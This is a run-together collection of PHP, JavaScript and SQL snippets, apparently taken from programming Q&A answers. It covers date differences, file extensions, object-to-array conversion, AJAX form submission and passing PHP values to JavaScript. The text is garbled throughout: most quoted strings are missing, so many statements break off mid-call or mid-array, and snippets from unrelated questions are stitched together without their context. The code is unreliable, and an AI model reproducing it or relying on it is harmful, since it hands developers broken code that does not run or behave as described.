/** * * @param DateTime $oDate1 * @param DateTime $oDate2 * @return array */ function date_diff_array(DateTime $oDate1, DateTime $oDate2) { $aIntervals = array( ); foreach($aIntervals as $sInterval => &$iInterval) { while($oDate1 <= $oDate2){ $oDate1->modify( if ($oDate1 > $oDate2) { $oDate1->modify( break; } else { $iInterval++; } } } return $aIntervals; }
$oDate = new DateTime(); $oDate->modify( var_dump($oDate); var_dump(date_diff_array(new DateTime(), $oDate));
1 Year, 10 Months, 2 Weeks, 5 Days, 10 Hours, 16 Minutes
<?php $today = strtotime("2011-02-03 00:00:00"); $myBirthDate = strtotime("1964-10-30 00:00:00"); printf("Days since my birthday: ", ($today - $myBirthDate)/60/60/24); ?>
4 months ago 4 months, 2 weeks, 3 days, 1 hour, 49 minutes, 15 seconds ago
function time_diff_string($from, $to, $full = false) { $from = new DateTime($from); $to = new DateTime($to); $diff = $to->diff($from); $diff->w = floor($diff->d / 7); $diff->d -= $diff->w * 7; $string = array( ); foreach ($string as $k => &$v) { if ($diff->$k) { $v = $diff->$k . } else { unset($string[$k]); } } if (!$full) $string = array_slice($string, 0, 1); return $string ? implode( }
$diff = abs($endDate - $startDate); $my_t=getdate($diff); print("$my_t[year] years, $my_t[month] months and $my_t[mday] days");
$startDate = strtotime($startDateStr); $endDate = strtotime($endDateStr);
<?php per_days_diff( function per_days_diff($start_date, $end_date) { $per_days = 0; $noOfWeek = 0; $noOfWeekEnd = 0; $highSeason=array("7", "8"); $current_date = strtotime($start_date); $current_date += (24 * 3600); $end_date = strtotime($end_date); $seassion = (in_array(date( $noOfdays = array( while ($current_date <= $end_date) { if ($current_date <= $end_date) { $date = date( array_push($noOfdays,$date); $current_date = strtotime( } } $finalDays = array_shift($noOfdays); $weekFirst = array("week"=>array(),"weekEnd"=>array()); for($i = 0; $i < count($noOfdays); $i++) { if ($noOfdays[$i] == 1) { if($noOfdays[$i+6]==7) { $noOfWeek++; $i=$i+6; } else { $per_days++; } } else if($noOfdays[$i]==5) { if($noOfdays[$i+2] ==7) { $noOfWeekEnd++; $i = $i+2; } else { $per_days++; } } else { $per_days++; } } /*echo $noOfWeek; echo "<br/>"; echo $noOfWeekEnd; echo "<br/>"; print_r($per_days); echo "<br/>"; print_r($weekFirst); */ $duration = array("weeks"=>$noOfWeek, "weekends"=>$noOfWeekEnd, "perDay"=>$per_days, "seassion"=>$seassion); return $duration; ?>
$date1= $date2= echo getYearDifference ($date1,$date2); function getYearDifference($date1=strtotime($date1),$date2=strtotime($date2)){ $year = 0; while($date2 > $date1 = strtotime( ++$year; } return $year; }
if(function_exists( function grk_Datetime_Since($From, $To= if(empty($To) === TRUE){ $To = time(); } if(is_int($From) === FALSE){ $From = strtotime($From); }; if(is_int($To) === FALSE){ $To = strtotime($To); } if($From === FALSE OR $From === -1 OR $To === FALSE OR $To === -1){ return FALSE; } $From = new DateTime(@date( $To = new DateTime(@date( if(($Diff = $From->diff($To)) === FALSE){ return FALSE; } $Words = array_merge(array( ), $Words); if($Diff->y > 1){ $Text = $Diff->y. } elseif($Diff->y == 1){ $Text = } elseif($Diff->m > 1){ $Text = $Diff->m. } elseif($Diff->m == 1){ $Text = } elseif($Diff->d > 7){ $Text = ceil($Diff->d/7). } elseif($Diff->d == 7){ $Text = } elseif($Diff->d > 1){ $Text = $Diff->d. } elseif($Diff->d == 1){ $Text = } elseif($Diff->h > 1){ $Text = $Diff->h. } elseif($Diff->h == 1){ $Text = } elseif($Diff->i > 1){ $Text = $Diff->i. } elseif($Diff->i == 1){ $Text = } elseif($Diff->s > 1){ $Text = $Diff->s. } else { $Text = } return $Prefix.$Text.$Suffix; } }
$date1 = date_create("2007-03-24"); $date2 = date_create("2009-06-26"); $dateDifference = date_diff($date1, $date2)->format( echo $dateDifference;
<?php function time_diff($start, $end = NULL, $convert_to_timestamp = FALSE) { if ($convert_to_timestamp || !is_numeric($start)) { $timestamp_start = strtotime($start); } else { $timestamp_start = $start; } if (!is_null($end) && (!empty($end) && !is_numeric($end))) { $timestamp_end = strtotime($end); } else { $timestamp_end = time(); } $start_time = (int) $timestamp_start; $end_time = (int) $timestamp_end; $start_time_var = $end_time_var = $pos_neg = 1; if ($end_time <= $start_time) { $start_time_var = $end_time_var = $pos_neg = -1; } $then = new DateTime(date( $now = new DateTime(date( $years_then = $then->format( $years_now = $now->format( $years = $years_now - $years_then; $months_then = $then->format( $months_now = $now->format( $months = $months_now - $months_then; $days_then = $then->format( $days_now = $now->format( $days = $days_now - $days_then; $hours_then = $then->format( $hours_now = $now->format( $hours = $hours_now - $hours_then; $minutes_then = $then->format( $minutes_now = $now->format( $minutes = $minutes_now - $minutes_then; $seconds_then = $then->format( $seconds_now = $now->format( $seconds = $seconds_now - $seconds_then; if ($seconds < 0) { $minutes -= 1; $seconds += 60; } if ($minutes < 0) { $hours -= 1; $minutes += 60; } if ($hours < 0) { $days -= 1; $hours += 24; } $months_last = $months_now - 1; if ($months_now == 1) { $years_now -= 1; $months_last = 12; } if ($months_last == 9 || $months_last == 4 || $months_last == 6 || $months_last == 11) { $days_last_month = 30; } else if ($months_last == 2) { if (($years_now % 4) == 0) { $days_last_month = 29; } else { $days_last_month = 28; } } else { $days_last_month = 31; } if ($days < 0) { $months -= 1; $days += $days_last_month; } if ($months < 0) { $years -= 1; $months += 12; } $out = new stdClass; $out->years = (int) $years * $pos_neg; $out->months = (int) $months * $pos_neg; $out->days = (int) $days * $pos_neg; $out->hours = (int) $hours * $pos_neg; $out->minutes = (int) $minutes * $pos_neg; $out->seconds = (int) $seconds * $pos_neg; return $out; }
<?php $birthday = $check_age_for_this_date = $age = time_diff($birthday, $check_age_for_this_date)->years; print $age;
<?php $christmas_2020 = $countdown = time_diff($christmas_2020); print_r($countdown);
mysql> select firstName, convert_tz(loginDate, +-----------+---------------------+------+------+------+--------+ | firstName | loginDate | Day | Hour | Min | Sec | +-----------+---------------------+------+------+------+--------+ | Peter | 2014-03-30 18:54:40 | 0 | 4 | 244 | 14644 | | Keith | 2014-03-30 18:54:11 | 0 | 4 | 244 | 14673 | | Andres | 2014-03-28 09:20:10 | 2 | 61 | 3698 | 221914 | | Nadeem | 2014-03-26 09:33:43 | 4 | 109 | 6565 | 393901 | +-----------+---------------------+------+------+------+--------+ 4 rows in set (0.00 sec)
$date1 = date_create( $date2 = date_create( $interval = date_diff($date1, $date2); echo "difference : " . $interval->y . " years, " . $interval->m." months, ".$interval->d." days ";
$date1=date_create("2007-03-24"); $date2=date_create("2009-06-26"); $diff=date_diff($date1,$date2); echo $diff->format("%R%a days");
$datediff_q = $dbh->prepare("SELECT DATEDIFF(:date2, :date1)"); $datediff_q->bindValue( $datediff_q->bindValue( $datediff = ($datediff_q->execute()) ? $datediff_q->fetchColumn(0) : false;
/** * Returns how long ago something happened in the past, showing it * as n seconds / minutes / hours / days / weeks / months / years ago. * * For periods over a day, it rolls over at midnight (so doesn * on current time of day), and it correctly accounts for month-lengths * and leap-years (months and years rollover on current day of month). * * $param string $timestamp in DateTime format * $return string description of interval */ function ago($timestamp) { $then = date_create($timestamp); $today = date_create( $diff = date_diff($then, $today); if ($diff->y > 0) return $diff->y. if ($diff->m > 0) return $diff->m. $diffW = floor($diff->d / 7); if ($diffW > 0) return $diffW. if ($diff->d > 1) return $diff->d. $now = date_create(); $diff = date_diff($then, $now); if ($diff->d > 0) return if ($diff->h > 0) return $diff->h. if ($diff->i > 0) return $diff->i. return $diff->s. }
function format_date($date, $type, $seperator="-") { if($date) { $day = date("j", strtotime($date)); $month = date("n", strtotime($date)); $year = date("Y", strtotime($date)); $hour = date("H", strtotime($date)); $min = date("i", strtotime($date)); $sec = date("s", strtotime($date)); switch($type) { case 0: $date = date("Y".$seperator."m".$seperator."d",mktime($hour, $min, $sec, $month, $day, $year)); break; case 1: $date = date("D, F j, Y",mktime($hour, $min, $sec, $month, $day, $year)); break; case 2: $date = date("d".$seperator."m".$seperator."Y",mktime($hour, $min, $sec, $month, $day, $year)); break; case 3: $date = date("d".$seperator."M".$seperator."Y",mktime($hour, $min, $sec, $month, $day, $year)); break; case 4: $date = date("d".$seperator."M".$seperator."Y h:i A",mktime($hour, $min, $sec, $month, $day, $year)); break; case 5: $date = date("m".$seperator."d".$seperator."Y",mktime($hour, $min, $sec, $month, $day, $year)); break; case 6: $date = date("M",mktime($hour, $min, $sec, $month, $day, $year)); break; case 7: $date = date("Y",mktime($hour, $min, $sec, $month, $day, $year)); break; case 8: $date = date("j",mktime($hour, $min, $sec, $month, $day, $year)); break; case 9: $date = date("n",mktime($hour, $min, $sec, $month, $day, $year)); break; case 10: $diff = abs(strtotime($date) - strtotime(date("Y-m-d h:i:s"))); $years = floor($diff / (365*60*60*24)); $months = floor(($diff - $years * 365*60*60*24) / (30*60*60*24)); $days = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24)/ (60*60*24)); $date = $years . " years, " . $months . " months, " . $days . "days"; } } return($date); }
<?php $date1 = date_create("2007-03-24"); echo "Start date: ".$date1->format("Y-m-d")."<br>"; $date2 = date_create("2009-06-26"); echo "End date: ".$date2->format("Y-m-d")."<br>"; $diff = date_diff($date1,$date2); echo "Difference between start date and end date: ".$diff->format("%y years, %m months and %d days")."<br>"; ?>
function getAge($dob, $age_at_date) { $d1 = new DateTime($dob); $d2 = new DateTime($age_at_date); $age = $d2->diff($d1); $years = $age->y; $months = $age->m; return $years. }
function getAge($dob) { $d1 = new DateTime($dob); $d2 = new DateTime(date()); $age = $d2->diff($d1); $years = $age->y; $months = $age->m; return $years. }
function time_difference($time_1, $time_2, $limit = null) { $val_1 = new DateTime($time_1); $val_2 = new DateTime($time_2); $interval = $val_1->diff($val_2); $output = array( "year" => $interval->y, "month" => $interval->m, "day" => $interval->d, "hour" => $interval->h, "minute" => $interval->i, "second" => $interval->s ); $return = ""; foreach ($output AS $key => $value) { if ($value == 1) $return .= $value . " " . $key . " "; elseif ($value >= 1) $return .= $value . " " . $key . "s "; if ($key == $limit) return trim($return); } return trim($return); }
function dateDifference($startDate, $endDate) { $startDate = strtotime($startDate); $endDate = strtotime($endDate); if ($startDate === false || $startDate < 0 || $endDate === false || $endDate < 0 || $startDate > $endDate) return false; $years = date( $endMonth = date( $startMonth = date( $months = $endMonth - $startMonth; if ($months <= 0) { $months += 12; $years--; } if ($years < 0) return false; $measure = ($months == 1) ? $days = $endDate - strtotime( $days = date( return array($years, $months, $days); }
function date_dif($since, $until, $keys = { $date = array_map( if ((count($date = array_filter($date, { $result = array_fill_keys(explode( foreach (preg_grep( { while ($date[1] >= strtotime(sprintf( { ++$value; } $date[0] = strtotime(sprintf( } foreach (preg_grep( { if (($value = intval(abs($date[0] - $date[1]) / strtotime(sprintf( { $date[0] = strtotime(sprintf( } } return $result; } return false; }
echo humanize(date_dif( echo humanize(date_dif( echo humanize(date_dif( echo humanize(date_dif( echo humanize(date_dif( echo humanize(date_dif( echo humanize(date_dif( function humanize($array) { $result = array(); foreach ($array as $key => $value) { $result[$key] = $value . if ($value != 1) { $result[$key] .= } } return implode( }
$ISOstartDate = "1987-06-22"; $ISOtodaysDate = "2013-06-22";
$years = $zDate[0][0] - $yDate[0][0]; if ($months == 0 and $zDate[0][1] > $ydate[0][1]) { $years = $years -1; } echo "\nCurrent years => ".$years; $months = $zDate[0][1] - $yDate[0][1]; echo "\nCurrent months => ".$months; switch ($yDate[0][1]){ case 01: $monthDays = case 02: $monthDays = case 03: $monthDays = case 04: $monthDays = case 05: $monthDays = case 06: $monthDays = case 07: $monthDays = case 08: $monthDays = case 09: $monthDays = case 10: $monthDays = case 11: $monthDays = case 12: $monthDays = }; echo "\nDays in start month ".$yDate[0][1]." => ".$monthDays; $days = $zDate[0][2] - $yDate[0][2] +$monthDays; echo "\nCurrent days => ".$days."\n"; if($days < $monthDays && $months == 0) { $months = 11; } else { $months = 0; $years = $years+1; $days = $days-$monthDays; }; if ($days == $monthDays ) { $days = 0; }; echo "\nTherefore, the number of years/ months/ days/ \nbetween start and todays date::\n\n"; printf("%d years, %d months, %d days\n", $years, $months, $days);
$date = $dateOfReturn = $substract = str_replace( $substract2 = str_replace( $date1 = $substract; $date2 = $substract2; $ts1 = strtotime($date1); $ts2 = strtotime($date2); $year1 = date( $year2 = date( $month1 = date( $month2 = date( echo $diff = (($year2 - $year1) * 12) + ($month2 - $month1);
$ext = end(explode( $ext = substr(strrchr($filename, $ext = substr($filename, strrpos($filename, $ext = preg_replace( $exts = split("[/\\.]", $filename); $n = count($exts)-1; $ext = $exts[$n];
dirname(parse_url($url)[ basename(parse_url($url)) 🡺 sympony.mp3 pathinfo(parse_url($url)[
$file = new SplFileInfo($path); $ext = $file->getExtension();
$finfo = new FileInfo(null, switch ($finfo->file($_FILES[ case $im = imagecreatefromjpeg($_FILES[ break; case $im = imagecreatefrompng($_FILES[ break; case $im = imagecreatefromgif($_FILES[ break; }
<?php $info = new SplFileInfo( var_dump($info->getExtension()); $info = new SplFileInfo( var_dump($info->getExtension()); ?>
<?php $ext = pathinfo( var_dump($ext); $ext = pathinfo( var_dump($ext); ?>
$path = echo ltrim(strstr($path, echo pathinfo($path, PATHINFO_EXTENSION);
$file_ext = explode( $file_ext_count=count($file_ext); $cnt=$file_ext_count-1; $file_extension= $file_ext[$cnt];
$path_parts = pathinfo( echo $path_parts[ echo $path_parts[ echo $path_parts[ echo $path_parts[
$info = new SplFileInfo( echo $info->getExtension();
$url_components = parse_url($url); $url_path = $url_components[ $ext = pathinfo($url_path, PATHINFO_EXTENSION);
pathinfo(basename( $_FILES["fileToUpload"]["name"]),PATHINFO_EXTENSION)
<?php $files=glob("abc/*.*"); for($i=0;$i<count($files);$i++): $extension = pathinfo($files[$i], PATHINFO_EXTENSION); $ext[]=$extension; if($extension== } endfor; print_r($ext); ?>
function getExt($path) { $basename = basename($path); return substr($basename, strlen(explode( }
substr(string $string, int $start, int[optional] $length=null);
$object = new StdClass; $object->foo = 1; $object->bar = 2; var_dump( (array) $object );
class Foo { private $foo; protected $bar; public $baz; public function __construct() { $this->foo = 1; $this->bar = 2; $this->baz = new StdClass; } } var_dump( (array) new Foo );
$array = json_decode(json_encode($nested_object), true);
function object_to_array($data) { if (is_array($data) || is_object($data)) { $result = array(); foreach ($data as $key => $value) { $result[$key] = object_to_array($value); } return $result; } return $data; }
function dismount($object) { $reflectionClass = new ReflectionClass(get_class($object)); $array = array(); foreach ($reflectionClass->getProperties() as $property) { $property->setAccessible(true); $array[$property->getName()] = $property->getValue($object); $property->setAccessible(false); } return $array; }
function entity2array($entity, $recursionDepth = 2) { $result = array(); $class = new ReflectionClass(get_class($entity)); foreach ($class->getMethods(ReflectionMethod::IS_PUBLIC) as $method) { $methodName = $method->name; if (strpos($methodName, "get") === 0 && strlen($methodName) > 3) { $propertyName = lcfirst(substr($methodName, 3)); $value = $method->invoke($entity); if (is_object($value)) { if ($recursionDepth > 0) { $result[$propertyName] = $this->entity2array($value, $recursionDepth - 1); } else { $result[$propertyName] = "***"; } } else { $result[$propertyName] = $value; } } } return $result; }
class Test{ const A = 1; public $b = private $c = test::A; public function __toArray(){ return call_user_func( } } $my_test = new Test(); var_dump((array)$my_test); var_dump($my_test->__toArray());
array(2) { ["b"]=> string(3) "two" ["Testc"]=> int(1) } array(1) { ["b"]=> string(3) "two" }
function object_to_array($data) { if ((! is_array($data)) and (! is_object($data))) return $result = array(); $data = (array) $data; foreach ($data as $key => $value) { if (is_object($value)) $value = (array) $value; if (is_array($value)) $result[$key] = object_to_array($value); else $result[$key] = $value; } return $result; }
function object_to_array_recusive ( $object, $assoc=TRUE, $empty= { $res_arr = array(); if (!empty($object)) { $arrObj = is_object($object) ? get_object_vars($object) : $object; $i=0; foreach ($arrObj as $key => $val) { $akey = ($assoc !== FALSE) ? $key : $i; if (is_array($val) || is_object($val)) { $res_arr[$akey] = (empty($val)) ? $empty : object_to_array_recusive($val); } else { $res_arr[$akey] = (empty($val)) ? $empty : (string)$val; } $i++; } } return $res_arr; }
$new_arr1 = object_to_array_recusive($my_object); $new_arr2 = object_to_array_recusive($my_object,FALSE);
function objectToArray($d) { if (is_object($d)) { $d = get_object_vars($d); } if (is_array($d)) { /* * Return array converted to object * Using __FUNCTION__ (Magic constant) * for recursive call */ return array_map(__FUNCTION__, $d); } else { return $d; } }
function arrayToObject($d) { if (is_array($d)) { /* * Return array converted to object * Using __FUNCTION__ (Magic constant) * for recursive call */ return (object) array_map(__FUNCTION__, $d); } else { return $d; } }
$init = new stdClass; $init->foo = "Test data"; $init->bar = new stdClass; $init->bar->baaz = "Testing"; $init->bar->fooz = new stdClass; $init->bar->fooz->baz = "Testing again"; $init->foox = "Just test"; $array = objectToArray($init); $object = arrayToObject($array); print_r($init); echo "\n"; print_r($array); echo "\n"; print_r($object);
function object_to_array($object) { return (array) $object; }
function objetToArray($adminBar){ $reflector = new ReflectionObject($adminBar); $nodes = $reflector->getProperties(); $out=[]; foreach ($nodes as $node) { $nod=$reflector->getProperty($node->getName()); $nod->setAccessible(true); $out[$node->getName()]=$nod->getValue($adminBar); } return $out; }
$result = $mysqli->query($query); $result = db_result_to_array($result); function db_result_to_array($result) { $res_array = array(); for ($count=0; $row = $result->fetch_assoc(); $count++) $res_array[$count] = $row; return $res_array; }
function readObject($object) { $name = get_class ($object); $name = str_replace( $raw = (array)$object; $attributes = array(); foreach ($raw as $attr => $val) { $attributes[preg_replace( } return $attributes; }
class PersonArray implements \ArrayAccess, \IteratorAggregate { public function __construct(Person $person) { $this->person = $person; } }
class PersonTransferObject { private $person; public function __construct(Person $person) { $this->person = $person; } public function toArray() { return [ ]; } }
$array = (array) $object; foreach($array as $key => $val) { $new_array[str_replace( }
/*** mixed Obj2Array(mixed Obj)***************************************/ static public function Obj2Array($_Obj) { if (is_object($_Obj)) $_Obj = get_object_vars($_Obj); return(is_array($_Obj) ? array_map(__METHOD__, $_Obj) : $_Obj); }
function objectToArray($o) { $a = array(); foreach ($o as $k => $v) $a[$k] = (is_array($v) || is_object($v)) ? objectToArray($v): $v; return $a; }
use Symfony\Component\Serializer\Encoder\JsonEncoder; use Symfony\Component\Serializer\Normalizer\ObjectNormalizer; use Symfony\Component\Serializer\Serializer; $serializer = new Serializer([new ObjectNormalizer()], [new JsonEncoder()]); $array = json_decode($serializer->serialize($object,
$Menu = new Admin_Model_DbTable_Menu(); $row = $Menu->fetchRow($Menu->select()->where( $Addmenu = new Admin_Form_Addmenu(); $Addmenu->populate($row->toArray());
/** * Converts given object to array, recursively. * Just outputs public properties. * * @param object|array $object * @return array|string */ protected function objectToArray($object) { if (in_array($object, $this->usedObjects, TRUE)) { return } if (is_array($object) || is_object($object)) { if (is_object($object)) { $this->usedObjects[] = $object; } $result = array(); $reflectorClass = new \ReflectionClass(get_class($this)); foreach ($object as $key => $value) { if ($reflectorClass->hasProperty($key) && $reflectorClass->getProperty($key)->isPublic()) { $result[$key] = $this->objectToArray($value); } } return $result; } return $object; }
function object_to_array($obj) { if (is_object($obj)) $obj = (array)$this->dismount($obj); if (is_array($obj)) { $new = array(); foreach ($obj as $key => $val) { $new[$key] = $this->object_to_array($val); } } else $new = $obj; return $new; } function dismount($object) { $reflectionClass = new \ReflectionClass(get_class($object)); $array = array(); foreach ($reflectionClass->getProperties() as $property) { $property->setAccessible(true); $array[$property->getName()] = $property->getValue($object); $property->setAccessible(false); } return $array; }
$valueRows = json_decode("{...}"); foreach($valueRows as $valueRow){ foreach($references as $reference){ if(isset($valueRow->{$reference->valueName})){ $tableHtml .= $valueRow->{$reference->valueName}; }else{ $tableHtml .= "&nbsp;"; } } }
public function dismount($object) { $reflectionClass = new \ReflectionClass(get_class($object)); $array = array(); foreach ($reflectionClass->getProperties() as $property) { $property->setAccessible(true); if (is_object($property->getValue($object))) { $array[$property->getName()] = $this->dismount($property->getValue($object)); } else { $array[$property->getName()] = $property->getValue($object); } $property->setAccessible(false); } return $array; }
$data = file_get_contents( "file.txt" ); if( $data === false ) { die( "Failure." ); } do_something_important( $data );
HTTP/1.1 304 Not Modified Connection: Keep-Alive Keep-Alive: timeout=5, max=100
<form name="foo" action="form.php" method="POST" id="foo"> <label for="bar">A bar</label> <input id="bar" name="bar" type="text" value="" /> <input type="submit" value="Send" /> </form>
<form id="foo"> <label for="bar">A bar</label> <input id="bar" name="bar" type="text" value="" /> <input type="submit" value="Send" /> </form>
var request; $(" event.preventDefault(); if (request) { request.abort(); } var $form = $(this); var $inputs = $form.find("input, select, button, textarea"); var serializedData = $form.serialize(); $inputs.prop("disabled", true); request = $.ajax({ url: "/form.php", type: "post", data: serializedData }); request.done(function (response, textStatus, jqXHR){ console.log("Hooray, it worked!"); }); request.fail(function (jqXHR, textStatus, errorThrown){ console.error( "The following error occurred: "+ textStatus, errorThrown ); }); request.always(function () { $inputs.prop("disabled", false); }); });
<form id="foo"> <label for="bar">A bar</label> <input id="bar" name="bar" type="text" value="" /> <input type="submit" value="Send" /> </form> <!-- The result of the search will be rendered inside this div --> <div id="result"></div>
var values = $(this).serialize(); $.ajax({ url: "test.php", type: "post", data: values , success: function (response) { }, error: function(jqXHR, textStatus, errorThrown) { console.log(textStatus, errorThrown); } });
$(" var ajaxRequest; event.preventDefault(); $(" var values = $(this).serialize(); /* I am not aborting previous request because It Once it abort(). jQuery Ajax methods return an XMLHttpRequest object, so you can just use abort(). */ ajaxRequest= $.ajax({ url: "test.php", type: "post", data: values }); /* request cab be abort by ajaxRequest.abort() */ ajaxRequest.done(function (response, textStatus, jqXHR){ $(" }); ajaxRequest.fail(function (){ $(" });
ajaxRequest.done(function (response){ alert(response); });
var ajaxRequest= $.post( "test.php",values, function(data) { alert( data ); }) .fail(function() { alert( "error" ); }) .always(function() { alert( "finished" ); });
<form method="post" name="postForm"> <ul> <li> <label>Name</label> <input type="text" name="name" id="name" placeholder="Bruce Wayne"> <span class="throw_error"></span> <span id="success"></span> </li> </ul> <input type="submit" value="Send" /> </form>
$(document).ready(function() { $( $( $( var postForm = { }; $.ajax({ type : url : data : postForm, dataType : success : function(data) { if (!data.success) { if (data.errors.name) { $( } } else { $( } } }); event.preventDefault(); }); });
$errors = array(); $form_data = array(); if (empty($_POST[ $errors[ } if (!empty($errors)) { $form_data[ $form_data[ } else { $form_data[ $form_data[ } echo json_encode($form_data);
$(" $( if($("form { $.ajax({ type: "POST", url: "<?php echo site_url( data: $( success: function(msg) { var msg = $.parseJSON(msg); if(msg.success== { return true; } else { alert( return false; } } }); } return false; });
<form name="foo" action="form.php" method="POST" id="foo"> <label for="bar">A bar</label> <input id="bar" class="inputs" name="bar" type="text" value="" /> <input type="submit" value="Send" onclick="submitform(); return false;" /> </form>
function submitform() { var inputs = document.getElementsByClassName("inputs"); var formdata = new FormData(); for(var i=0; i<inputs.length; i++) { formdata.append(inputs[i].name, inputs[i].value); } var xmlhttp; if(window.XMLHttpRequest) { xmlhttp = new XMLHttpRequest; } else { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); } xmlhttp.onreadystatechange = function() { if(xmlhttp.readyState == 4 && xmlhttp.status == 200) { } } xmlhttp.open("POST", "insert.php"); xmlhttp.send(formdata); }
$(document).on("submit", "form", function(event) { event.preventDefault(); var url=$(this).attr("action"); $.ajax({ url: url, type: dataType: "JSON", data: new FormData(this), processData: false, contentType: false, success: function (data, status) { }, error: function (xhr, desc, err) { console.log("error"); } }); });
<script src="http: <form method="post" id="form_content" action="Javascript:void(0);"> <button id="desc" name="desc" value="desc" style="display:none;">desc</button> <button id="asc" name="asc" value="asc">asc</button> <input type= </form> <div id="demoajax"></div> <script> numbers = $( $( numbers = this.id; function_two(numbers); }); function function_two(numbers){ if (numbers === { $( } else { $( } $.ajax({ url: type: data: $( success: function(data){ $( $( } }); return false; } $(document).ready(function_two()); </script>
<script> $(document).ready(function () { $(" $.ajax({ url: type: data: {bar: $(" success: function (result) { alert( } }); }); }); </script> <label for="bar">A bar</label> <input id="bar" name="bar" type="text" value="" /> <input id="btnSend" type="button" value="Send" />
var formData = formData; $.ajax({ type: "POST", url: url, async: false, data: formData, processData: false, contentType: false, xhr: function () { $(" var xhr = new window.XMLHttpRequest(); xhr.upload.addEventListener("progress", function (evt) { if (evt.lengthComputable) { var percentComplete = (evt.loaded / evt.total) * 100; $( } }, false); xhr.addEventListener("progress", function (evt) { if (evt.lengthComputable) { var percentComplete = evt.loaded / evt.total; } }, false); return xhr; }, beforeSend: function (xhr) { qyuraLoader.startLoader(); }, success: function (response, textStatus, jqXHR) { qyuraLoader.stopLoader(); try { $(" var data = $.parseJSON(response); if (data.status == 0) { if (data.isAlive) { $( console.log(data.errors); $.each(data.errors, function (index, value) { if (typeof data.custom == $( } else { $( if (index == { $( } else { $( } } }); if (data.errors.TopError) { $( $( setTimeout(function () { $( $( }, 5000); } } else { $( } } else { $( $( $( if (data.msg != bootbox.alert({closeButton: false, message: data.msg, callback: function () { if (data.url) { window.location.href = } else { location.reload(true); } }}); } else { bootbox.alert({closeButton: false, message: "Success", callback: function () { if (data.url) { window.location.href = } else { location.reload(true); } }}); } } } catch (e) { if (e) { $( $( setTimeout(function () { $( $( }, 5000); } } } });
<script type="text/javascript"> function ap(x,y) {$(" function af(x,y) {$(" </script>
<form> ... <input type="button" onclick="af( </form> <div id="load_response">this is where response will be loaded</div>
$( class or id also) var formData = $( var url = $.ajax({ type : url : data : formData, dataType : beforeSend : function() { you want like show loaded }, success:function(response){ var obj = eval(response); if(obj) { if(obj.error==0){ alert( } else{ alert( } } }, complete : function() { }, error:function (xhr, ajaxOptions, thrownError){ alert( } }); event.preventDefault(); });
namespace foo { const BAR = 1; define( define(__NAMESPACE__ . } namespace { var_dump(get_defined_constants(true)); }
const FOOBAR = const FORTY_TWO = 6 * 9; const ULTIMATE_ANSWER =
<?php namespace foo { const BAR = define( printf("What kind of bar is a %s bar?\n", BAR); printf("What kind of bar is a %s bar?\n", \BAR); } namespace foo2 { printf("Willy %s\n", BAR); printf("three %s\n", \foo\BAR); } ?>
What kind of bar is a cheers bar? What kind of bar is a wonka bar? willy wonka three cheers
const AWESOME = whatIsMyName(); const WEAKNESS = 4+5+6; const FOO = BAR . OF . SOAP;
class Foo { const BAR = 1; public function myMethod() { return self::BAR; } }
/** * My foo-bar const * @var string */ const FOO =
<script> myPlugin.start($val); <?php myPlugin.start($val); ?> myPlugin.start(<?=$val?> </script>
/* Do some operation here, like talk to the database, the file-session * The world beyond, limbo, the city of shimmers, and Canada. * * AJAX generally uses strings, but you can output JSON, HTML and XML as well. * It all depends on the Content-type header that you send with your AJAX * request. */ echo json_encode(42);
<!-- snip --> <script> function reqListener () { console.log(this.responseText); } var oReq = new XMLHttpRequest(); oReq.onload = function() { alert(this.responseText); }; oReq.open("get", "get-data.php", true); oReq.send(); </script> <!-- snip -->
<!-- snip --> <div id="dom-target" style="display: none;"> <?php $output = "42"; echo htmlspecialchars($output); ?> </div> <script> var div = document.getElementById("dom-target"); var myData = div.textContent; </script> <!-- snip -->
<!-- snip --> <script> var data = <?php echo json_encode("42", JSON_HEX_TAG); ?>; </script> <!-- snip -->
var cookies = document.cookie.split(";"). map(function(el){ return el.split("="); }). reduce(function(prev,cur){ prev[cur[0]] = cur[1];return prev },{}); cookies["MyCookie"]
<script> var myServerData = <?=json_encode($value)?>; </script>
function callback(data){ } var httpRequest = new XMLHttpRequest; httpRequest.onreadystatechange = function(){ if (httpRequest.readyState === 4) { if (httpRequest.status === 200) { callback(httpRequest.responseText); } } }; httpRequest.open( httpRequest.send();
<$php ... $val = myService->getValue(); echo json_encode($val); $>
<div class="service-container" data-service="<?php echo $myService->getValue(); ?>"> </div> <script> $(document).ready(function() { $( var container = $(this); var service = container.data( }); }); </script>
<script> var jsvar = <?php echo json_encode($PHPVar); ?>; </script>
<script type="text/javascript"> var js_variable = <script>
<script type="text/javascript"> var js_variable = <?php echo json_encode($php_variable); ?>; </script>
class mHeader { private $scripts = array(); /** * @param string $id unique script identifier * @param string $src script src attribute * @param array $deps an array of dependencies ( script identifiers ). * @param array $data an array, data that will be json_encoded and available to the script. */ function enqueue_script( $id, $src, $deps = array(), $data = array() ) { $this->scripts[$id] = array( } private function dependencies( $script ) { if ( $script[ return array_map( array( $this, } } private function _unset( $key, &$deps, &$out ) { $out[$key] = $this->scripts[$key]; unset( $deps[$key] ); } private function flattern( &$deps, &$out = array() ) { foreach( $deps as $key => $value ) { empty($value) ? $this->_unset( $key, $deps, $out ) : $this->flattern( $deps[$key], $out ); } } function print_scripts() { if ( !$this->scripts ) return; $deps = array_map( array( $this, while ( $deps ) $this->flattern( $deps, $js ); foreach( $js as $key => $script ) { $script[ echo "<script id=\"$key-js\" src=\"$script[src]\" type=\"text/javascript\"></script>" . PHP_EOL; } } }
$header = new mHeader(); $header->enqueue_script( $header->enqueue_script( $header->enqueue_script( $header->print_scripts();
<script id="jquery-js" src=" <script id="jquery-ui-js" src=" <script> var mydata = {"value":20}; </script> <script id="custom-script-js" src="
<?php echo "<script> var x = ". json_encode($phpVariable)."</script>"; ?>
<?php $variable_1 = "QNimate"; $variable_2 = "QScutter"; ?> <span id="storage" data-variable-one="<?php echo $variable_1; ?>" data-variable-two="<?php echo $variable_2; ?>"></span> <?php
var variable_1 = undefined; var variable_2 = undefined; window.onload = function(){ variable_1 = document.getElementById("storage").getAttribute("data-variable-one"); variable_2 = document.getElementById("storage").getAttribute("data-variable-two"); }
<script> console.log("i am everywhere " + name); </script>
<script type="text/javascript" src="url_to_your_php_file.php" /></script>
<script type="text/javascript" src="url_to_your_php_file.php?var1=value1" /></script>
<?php header( $value = $val = $myService->getValue(); ?> function name() { var example1 = var example2 = var example3 = alert( example1 + } <?php @include @include exit; ?>
$php_var1 ="Hello world"; $php_var2 ="Helloow"; echo echo echo echo
